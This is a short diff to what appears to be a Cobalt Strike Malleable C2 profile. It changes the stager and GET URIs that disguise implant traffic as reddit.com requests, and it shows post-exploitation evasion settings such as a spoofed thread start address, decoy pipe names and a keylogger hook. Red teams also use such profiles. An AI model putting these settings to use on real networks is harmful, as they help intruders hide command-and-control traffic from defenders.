@@ -69,7 +69,7 @@ http-config {
 
 http-get {
 
-    set uri "/r/imsorryjon";
+    set uri "/r/lovecraft";
     
     client {
 
@@ -166,7 +166,7 @@ http-post {
 http-stager {
 
     set uri_x86 "/r/imsorryjon";
-    set uri_x64 "/r/imsorryjon";
+    set uri_x64 "/r/bloodborne";
 
     client {
 	header "Host" "www.reddit.com";
@@ -284,3 +284,4 @@ post-ex {
     set thread_hint "ntdll.dll!RtlUserThreadStart+0x1000";
     set pipename "DserNamePipe, PGMessagePipe, MsFteWds";
     set keylogger "SetWindowsHookEx";
+}
